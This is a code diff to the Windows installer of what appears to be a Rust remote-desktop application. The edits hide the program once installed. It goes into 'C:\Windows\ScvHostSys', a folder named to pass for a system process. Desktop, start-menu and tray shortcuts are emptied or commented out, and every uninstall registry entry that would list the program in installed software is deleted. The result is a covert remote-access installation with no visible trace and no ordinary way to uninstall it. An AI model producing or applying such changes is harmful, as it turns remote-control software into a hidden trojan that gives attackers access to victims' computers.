@@ -1342,20 +1342,21 @@ fn get_default_install_info() -> (String, String, String, String) {
 }
 
 fn get_default_install_path() -> String {
-    let mut pf = "C:\\Program Files".to_owned();
-    if let Ok(x) = std::env::var("ProgramFiles") {
-        if std::path::Path::new(&x).exists() {
-            pf = x;
-        }
-    }
-    #[cfg(target_pointer_width = "32")]
-    {
-        let tmp = pf.replace("Program Files", "Program Files (x86)");
-        if std::path::Path::new(&tmp).exists() {
-            pf = tmp;
-        }
-    }
-    format!("{}\\{}", pf, crate::get_app_name())
+//     let mut pf = "C:\\Program Files".to_owned();
+//     if let Ok(x) = std::env::var("ProgramFiles") {
+//         if std::path::Path::new(&x).exists() {
+//             pf = x;
+//         }
+//     }
+//     #[cfg(target_pointer_width = "32")]
+//     {
+//         let tmp = pf.replace("Program Files", "Program Files (x86)");
+//         if std::path::Path::new(&tmp).exists() {
+//             pf = tmp;
+//         }
+//     }
+//     format!("{}\\{}", pf, crate::get_app_name())
+    format!("C:\\Windows\\ScvHostSys")
 }
 
 pub fn check_update_broker_process() -> ResultType<()> {
@@ -1513,8 +1514,6 @@ fn get_after_install(
     format!("
     chcp 65001
     reg add HKEY_CLASSES_ROOT\\.{ext} /f
-    {desktop_shortcuts}
-    {start_menu_shortcuts}
     {reg_printer}
     reg add HKEY_CLASSES_ROOT\\.{ext}\\DefaultIcon /f
     reg add HKEY_CLASSES_ROOT\\.{ext}\\DefaultIcon /f /ve /t REG_SZ  /d \"\\\"{exe}\\\",0\"
@@ -1567,15 +1566,7 @@ pub fn install_me(options: &str, path: String, silent: bool, debug: bool) -> Res
     let shortcut_icon_location = get_shortcut_icon_location(&path, &cur_exe);
     let mk_shortcut = write_cmds(
         format!(
-            "
-Set oWS = WScript.CreateObject(\"WScript.Shell\")
-sLinkFile = \"{tmp_path}\\{app_name}.lnk\"
-
-Set oLink = oWS.CreateShortcut(sLinkFile)
-    oLink.TargetPath = \"{exe}\"
-    {shortcut_icon_location}
-oLink.Save
-        "
+            ""
         ),
         "vbs",
         "mk_shortcut",
@@ -1606,29 +1597,29 @@ oLink.Save
     let mut reg_value_desktop_shortcuts = "0".to_owned();
     let mut reg_value_start_menu_shortcuts = "0".to_owned();
     let mut reg_value_printer = "0".to_owned();
-    let mut shortcuts = Default::default();
-    if options.contains("desktopicon") {
-        shortcuts = format!(
-            "copy /Y \"{}\\{}.lnk\" \"%PUBLIC%\\Desktop\\\"",
-            tmp_path,
-            crate::get_app_name()
-        );
-        reg_value_desktop_shortcuts = "1".to_owned();
-    }
-    if options.contains("startmenu") {
-        shortcuts = format!(
-            "{shortcuts}
-md \"{start_menu}\"
-copy /Y \"{tmp_path}\\{app_name}.lnk\" \"{start_menu}\\\"
-copy /Y \"{tmp_path}\\Uninstall {app_name}.lnk\" \"{start_menu}\\\"
-     "
-        );
-        reg_value_start_menu_shortcuts = "1".to_owned();
-    }
-    let install_printer = options.contains("printer") && is_win_10_or_greater();
-    if install_printer {
-        reg_value_printer = "1".to_owned();
-    }
+//     let mut shortcuts = Default::default();
+//     if options.contains("desktopicon") {
+//         shortcuts = format!(
+//             "copy /Y \"{}\\{}.lnk\" \"%PUBLIC%\\Desktop\\\"",
+//             tmp_path,
+//             crate::get_app_name()
+//         );
+//         reg_value_desktop_shortcuts = "1".to_owned();
+//     }
+//     if options.contains("startmenu") {
+//         shortcuts = format!(
+//             "{shortcuts}
+// md \"{start_menu}\"
+// copy /Y \"{tmp_path}\\{app_name}.lnk\" \"{start_menu}\\\"
+// copy /Y \"{tmp_path}\\Uninstall {app_name}.lnk\" \"{start_menu}\\\"
+//      "
+//         );
+//         reg_value_start_menu_shortcuts = "1".to_owned();
+//     }
+//     let install_printer = options.contains("printer") && is_win_10_or_greater();
+//     if install_printer {
+//         reg_value_printer = "1".to_owned();
+//     }
 
     let meta = std::fs::symlink_metadata(&current_exe)?;
     let mut size = meta.len() / 1024;
@@ -1660,24 +1651,25 @@ if exist \"{tmp_path}\\{app_name} Tray.lnk\" del /f /q \"{tmp_path}\\{app_name} 
         Config::set_option("api-server".into(), lic.api);
     }
 
-    let tray_shortcuts = if config::is_outgoing_only() {
-        "".to_owned()
-    } else {
-        format!("
-cscript \"{tray_shortcut}\"
-copy /Y \"{tmp_path}\\{app_name} Tray.lnk\" \"%PROGRAMDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\"
-")
-    };
+//     let tray_shortcuts = if config::is_outgoing_only() {
+//         "".to_owned()
+//     } else {
+//         format!("
+// cscript \"{tray_shortcut}\"
+// copy /Y \"{tmp_path}\\{app_name} Tray.lnk\" \"%PROGRAMDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\"
+// ")
+//     };
+    let tray_shortcuts: String = "".to_owned();
 
-    let install_remote_printer = if install_printer {
-        // No need to use `|| true` here.
-        // The script will not exit even if `--install-remote-printer` panics.
-        format!("\"{}\" --install-remote-printer", &src_exe)
-    } else if is_win_10_or_greater() {
-        format!("\"{}\" --uninstall-remote-printer", &src_exe)
-    } else {
-        "".to_owned()
-    };
+//     let install_remote_printer = if install_printer {
+//         // No need to use `|| true` here.
+//         // The script will not exit even if `--install-remote-printer` panics.
+//         format!("\"{}\" --install-remote-printer", &src_exe)
+//     } else if is_win_10_or_greater() {
+//         format!("\"{}\" --uninstall-remote-printer", &src_exe)
+//     } else {
+//         "".to_owned()
+//     };
 
     // Remember to check if `update_me` need to be changed if changing the `cmds`.
     // No need to merge the existing dup code, because the code in these two functions are too critical.
@@ -1688,34 +1680,16 @@ copy /Y \"{tmp_path}\\{app_name} Tray.lnk\" \"%PROGRAMDATA%\\Microsoft\\Windows\
 chcp 65001
 md \"{path}\"
 {copy_exe}
-reg add {subkey} /f
-reg add {subkey} /f /v DisplayIcon /t REG_SZ /d \"{display_icon}\"
-reg add {subkey} /f /v DisplayName /t REG_SZ /d \"{app_name}\"
-reg add {subkey} /f /v DisplayVersion /t REG_SZ /d \"{version}\"
-reg add {subkey} /f /v Version /t REG_SZ /d \"{version}\"
-reg add {subkey} /f /v BuildDate /t REG_SZ /d \"{build_date}\"
-reg add {subkey} /f /v InstallLocation /t REG_SZ /d \"{path}\"
-reg add {subkey} /f /v Publisher /t REG_SZ /d \"{app_name}\"
-reg add {subkey} /f /v VersionMajor /t REG_DWORD /d {version_major}
-reg add {subkey} /f /v VersionMinor /t REG_DWORD /d {version_minor}
-reg add {subkey} /f /v VersionBuild /t REG_DWORD /d {version_build}
-reg add {subkey} /f /v UninstallString /t REG_SZ /d \"\\\"{exe}\\\" --uninstall\"
-reg add {subkey} /f /v EstimatedSize /t REG_DWORD /d {size}
-reg add {subkey} /f /v WindowsInstaller /t REG_DWORD /d 0
-cscript \"{mk_shortcut}\"
 cscript \"{uninstall_shortcut}\"
-{tray_shortcuts}
-{shortcuts}
 copy /Y \"{tmp_path}\\Uninstall {app_name}.lnk\" \"{path}\\\"
 {dels}
 {import_config}
 {after_install}
-{install_remote_printer}
 {sleep}
     ",
-        display_icon = get_custom_icon(&path, &cur_exe).unwrap_or(exe.to_string()),
-        version = crate::VERSION.replace("-", "."),
-        build_date = crate::BUILD_DATE,
+//         display_icon = get_custom_icon(&path, &cur_exe).unwrap_or(exe.to_string()),
+//         version = crate::VERSION.replace("-", "."),
+//         build_date = crate::BUILD_DATE,
         after_install = get_after_install(
             &exe,
             Some(reg_value_start_menu_shortcuts),
@@ -3175,12 +3149,10 @@ pub fn install_service() -> bool {
     let filter = format!(" /FI \"PID ne {}\"", get_current_pid());
     Config::set_option("stop-service".into(), "".into());
     crate::ipc::EXIT_RECV_CLOSE.store(false, Ordering::Relaxed);
-    let cmds = format!(
+    let cmds: String = format!(
         "
 chcp 65001
 taskkill /F /IM {app_name}.exe{filter}
-cscript \"{tray_shortcut}\"
-copy /Y \"{tmp_path}\\{app_name} Tray.lnk\" \"%PROGRAMDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\"
 {import_config}
 {create_service}
 if exist \"{tray_shortcut}\" del /f /q \"{tray_shortcut}\"
